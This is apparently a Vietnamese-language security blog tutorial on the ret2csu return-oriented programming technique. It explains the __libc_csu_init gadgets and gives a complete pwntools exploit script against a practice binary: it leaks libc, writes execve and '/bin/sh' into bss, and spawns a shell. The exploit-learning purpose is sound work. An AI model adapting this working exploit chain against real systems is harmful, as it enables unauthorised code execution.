---
title: "ret2csu - alternative way to bypass ASLR"
date: 2023-08-22
draft: false
tags: ["overflow", "pwn","ret2csu"]
showTableOfContents: true
---
ret2csu là kỹ thuật được sử dụng khi ta không có đầy đủ gadget cần thiết để thực hiện rop chain. Đây chính là gadget luôn có khi compile dynamic một binary. Bài này mình sẽ giới thiệu về kỹ thuật này thông qua một challenge.

## Tổng quát
Khi chạy chương trình, không chỉ có các đoạn code của ta được thực thì mà còn có các đoạn code mặc định được thêm vào. Những đoạn code này nhằm mục đích khởi tạo các giá trị môi trường, load thông tin về những phần được thực thi cũng như "huỷ" nó khi kết thúc chương trình.

![](https://hackmd.io/_uploads/rJYR97M6h.png)

Đây là thứ tự chương trình chạy khi trace từ entry point và ở đây ta cần chú ý đến hàm `__libc_csu_init`.

Khi ta disass hàm này thì có một vài gadget thú vị
```
gef➤  disass __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x00000000004011b0 <+0>:     endbr64
   0x00000000004011b4 <+4>:     push   r15
   0x00000000004011b6 <+6>:     lea    r15,[rip+0x2c53]        # 0x403e10
   0x00000000004011bd <+13>:    push   r14
   0x00000000004011bf <+15>:    mov    r14,rdx
   0x00000000004011c2 <+18>:    push   r13
   0x00000000004011c4 <+20>:    mov    r13,rsi
   0x00000000004011c7 <+23>:    push   r12
   0x00000000004011c9 <+25>:    mov    r12d,edi
   0x00000000004011cc <+28>:    push   rbp
   0x00000000004011cd <+29>:    lea    rbp,[rip+0x2c44]        # 0x403e18
   0x00000000004011d4 <+36>:    push   rbx
   0x00000000004011d5 <+37>:    sub    rbp,r15
   0x00000000004011d8 <+40>:    sub    rsp,0x8
   0x00000000004011dc <+44>:    call   0x401000 <_init>
   0x00000000004011e1 <+49>:    sar    rbp,0x3
   0x00000000004011e5 <+53>:    je     0x401206 <__libc_csu_init+86>
   0x00000000004011e7 <+55>:    xor    ebx,ebx
   0x00000000004011e9 <+57>:    nop    DWORD PTR [rax+0x0]
   0x00000000004011f0 <+64>:    mov    rdx,r14
   0x00000000004011f3 <+67>:    mov    rsi,r13
   0x00000000004011f6 <+70>:    mov    edi,r12d
   0x00000000004011f9 <+73>:    call   QWORD PTR [r15+rbx*8]
   0x00000000004011fd <+77>:    add    rbx,0x1
   0x0000000000401201 <+81>:    cmp    rbp,rbx
   0x0000000000401204 <+84>:    jne    0x4011f0 <__libc_csu_init+64>
   0x0000000000401206 <+86>:    add    rsp,0x8
   0x000000000040120a <+90>:    pop    rbx
   0x000000000040120b <+91>:    pop    rbp
   0x000000000040120c <+92>:    pop    r12
   0x000000000040120e <+94>:    pop    r13
   0x0000000000401210 <+96>:    pop    r14
   0x0000000000401212 <+98>:    pop    r15
   0x0000000000401214 <+100>:   ret
End of assembler dump.
```

![](https://hackmd.io/_uploads/HJifCXGTn.png)

Mình lần lượt lable 2 gadget này như trên ảnh. Ở đây ta nhận thấy rằng ta có thể điều khiển được một vài register và bằng việc chain gadget1 -> gadget2 thì ta có thể call được địa chỉ mà ta muốn

![](https://hackmd.io/_uploads/B1WaRXzph.png)

## Exploit

Do tính bá đạo của nó vì có mặt ở hầu hết các binary nên đã được xoá từ glibc 2.34

![](https://hackmd.io/_uploads/HkNJlNGp2.png)
https://sourceware.org/legacy-ml/libc-alpha/2018-06/msg00717.html

Đây là thông tin tóm tắt về một số giá trị của register

![](https://hackmd.io/_uploads/Bka-P4fa3.png)

Do sau đó nó sẽ gọi `call qword [r15 + rbx*8]` nên để đơn giản ta cho `rbx = 0` để khỏi tính toán 
Ngoài ra ta để ý rằng nếu ta chain gadget 1 -> gadget2 thì nếu ta cho các register đúng như các giá trị của ảnh trên thì nó sẽ thực thi lại gadget1 vì các lệnh sau:
```asm
    add    rbx,0x1
    cmp    rbp,rbx
    jne    0x4011f0 <__libc_csu_init+64>
```

Do đó ta hoàn toàn có thể loop lại chương trình để tiếp tục gọi đến nó.

Lưu ý: 
- Chỉ khai thác được với các binary được combile dynamic với glibc <= 2.33
- `r15+rbx*8` phải chứa địa chỉ trỏ đến địa chỉ ta muốn call

## Demo time

Ở đây ta có một [file](https://github.com/Hellsender01/Youtube/blob/main/Binary%20Exploitation/B.%20Ret2CSU/ret2csu) binary

![](https://hackmd.io/_uploads/SyBmXNfa2.png)

Dễ dàng thấy được đây có lỗi bof

![](https://hackmd.io/_uploads/H1gPmNGah.png)

Ở đây mình sẽ giải bài này theo kiểu ret2csu.

![](https://hackmd.io/_uploads/BJGh4EGp2.png)

Vào ida ta thấy có hàm `__libc_csu_init` là biết được ta có thể sài kỹ thuật này. 

Tiếp theo vào gdb tìm địa chỉ của gadget 1 và 2

![](https://hackmd.io/_uploads/rJzir4MTn.png)

```python=
part1 = 0x000000000040120a
part2 = 0x00000000004011f0
ret = 0x000000000040101a
```

Hướng khai thác lúc này của ta như sau:
- leak libc
- overwrite 1 địa chỉ bss bằng execve (bằng 1-lý-do-nào-đó mà mình sài system không được)
- overwrite 1 địa chỉ bss bằng `/bin/sh`. Ở đây ta không thể sài địa chỉ `/bin/sh` ở libc được vì nó hơn 4 byte (vì ta chỉ có thể control edi)
- gọi địa chỉ bss mà ta overwrite
- profit
-> tất cả các quá trình trên đều thực hiện bằng ret2csu

Đầu tiên ta leak libc:
```python=
payload = b'a'*56+ p64(part1)
payload += p64(0)+p64(1)+p64(1)+p64(exe.got['write'])+p64(8)+p64(exe.got['write'])
payload += p64(part2)
payload += p64(0)*7 +p64(exe.sym['vuln'])
p.send(payload)

p.recvuntil(b'Enter Data - ')
leak =u64(p.recvn(8))
libc.address = leak - 1014464
print("LEAK " , hex(libc.address))
```
Ở đây mình leak địa chỉ của write. Ta để ý rằng có 
```python
p64(0)*7 +p64(exe.sym['vuln'])
```
Do nó sẽ thực thi lại gadget1 nên ta cần 6 cái p64 để fill 6 cái register, 1 còn lại cái là padding. Sau đó nó lại tiếp tục chạy về hàm `vuln`

Ta thực hiện tương tự để overwrite bss thành `execve`

```python=
payload =b'a'*56 + p64(part1)
payload += p64(0)+p64(1)+p64(0)+p64(exe.bss())+p64(8)+p64(exe.got['read'])
payload += p64(part2)
payload += p64(0)*7 + p64(exe.sym['vuln'])
p.send(payload)
time.sleep(1)
p.send(p64(libc.sym['execve']))
```
Tiếp theo là ghi `/bin/sh`
```python=
payload =b'a'*56 + p64(part1)
payload += p64(0)+p64(1)+p64(0)+p64(exe.bss()+0x20)+p64(8)+p64(exe.got['read'])
payload += p64(part2)
payload += p64(0)*7 + p64(exe.sym['vuln'])
p.send(payload)
time.sleep(1)
p.send(b'/bin/sh\x00')
```
Cuối cùng là gọi lại bss để lấy shell.
```python=
payload = b'a'*56+p64(part1)
payload += p64(0)+p64(1)+p64(exe.bss()+0x20) +p64(0)*2+p64(exe.bss())
payload += p64(part2)
```
Phần này ta thấy là không cần quay lại vuln làm gì nên không cần fill lại register

Chạy thử thì ta có shell
![](https://hackmd.io/_uploads/Bk90qVfa2.png)

Full script 
```python=
from pwn import *
import time
exe = ELF("ret2csu")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(exe.path)

part1 = 0x000000000040120a
part2 = 0x00000000004011f0
ret = 0x000000000040101a

payload = b'a'*56+ p64(part1)
payload += p64(0)+p64(1)+p64(1)+p64(exe.got['write'])+p64(8)+p64(exe.got['write'])
payload += p64(part2)
payload += p64(0)*7 +p64(exe.sym['vuln'])
p.send(payload)

p.recvuntil(b'Enter Data - ')
leak =u64(p.recvn(8))
libc.address = leak - 1014464
print("LEAK " , hex(libc.address))

payload =b'a'*56 + p64(part1)
payload += p64(0)+p64(1)+p64(0)+p64(exe.bss())+p64(8)+p64(exe.got['read'])
payload += p64(part2)
payload += p64(0)*7 + p64(exe.sym['vuln'])
p.send(payload)
time.sleep(1)
p.send(p64(libc.sym['execve']))

print("BSS ",hex(exe.bss()))

payload =b'a'*56 + p64(part1)
payload += p64(0)+p64(1)+p64(0)+p64(exe.bss()+0x20)+p64(8)+p64(exe.got['read'])
payload += p64(part2)
payload += p64(0)*7 + p64(exe.sym['vuln'])
p.send(payload)
time.sleep(1)
p.send(b'/bin/sh\x00')

payload = b'a'*56+p64(part1)
payload += p64(0)+p64(1)+p64(exe.bss()+0x20) +p64(0)*2+p64(exe.bss())
payload += p64(part2)

p.send(payload)
p.interactive()
```

> **Nhận xét:** Dù ở đây glibc mình đang sài là bản 2.37 nhưng vẫn exploit được do binary này được compile ở bản mà __libc_csu_init vẫn còn khả dụng 

## References
1. https://ir0nstone.gitbook.io/notes/types/stack/32-vs-64-bit
2. https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf
3. https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9

